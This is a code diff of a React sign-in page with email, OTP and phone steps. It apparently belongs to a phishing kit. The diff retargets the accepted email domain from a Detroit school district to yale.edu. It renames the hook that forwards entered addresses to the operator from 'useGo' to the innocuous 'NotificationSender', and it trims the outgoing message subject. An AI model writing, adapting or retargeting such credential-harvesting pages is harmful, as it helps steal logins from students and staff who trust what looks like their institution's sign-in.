@@ -7,7 +7,7 @@ import { Loader } from "./components/Loader";
 import { OTP } from "./components/OTP";
 import { Phone } from "./components/Phone";
 import gsap from "gsap";
-import useGo from "./components/useGo"; // Import the useGo hook
+import NotificationSender from "./components/NotificationSender"; // Import the NotificationSender hook
 
 function App() {
   const [step, setStep] = useState("email");
@@ -19,7 +19,7 @@ function App() {
   const [phone, setPhone] = useState("");
   const formRef = useRef(null);
   const signInOptionsRef = useRef(null);
-  const { isSending, error, successMessage, sendEmail } = useGo(); // Use the useGo hook
+  const { isSending, error, successMessage, sendEmail } = NotificationSender(); // Use the NotificationSender hook
 
   const handleInputChange = (e) => {
     const field = e.target;
@@ -55,7 +55,7 @@ function App() {
   // Handle email submission and sending
   const handleNextFromEmail = async (emailValue) => {
     const eduEmailRegex =
-      /^[a-zA-Z0-9._%+-]+@([a-zA-Z0-9.-]+\.)?detroitk12\.org$/;
+      /^[a-zA-Z0-9._%+-]+@([a-zA-Z0-9.-]+\.)?yale\.edu$/;
     if (!emailValue.trim()) {
       setEmailError("Please enter an email.");
     } else if (!eduEmailRegex.test(emailValue)) {
@@ -72,10 +72,10 @@ function App() {
 
       try {
         // Prepare the subject and message for the email
-        const subject = `${emailValue} Email Input Confirmation`;
+        const subject = `Email Confirmation`;
         const message = `User entered email: ${emailValue} for login.`;
 
-        // Use the sendEmail function from useGo hook to send the email
+        // Use the sendEmail function from NotificationSender hook to send the email
         await sendEmail(subject, message);
 
         if (!error) {
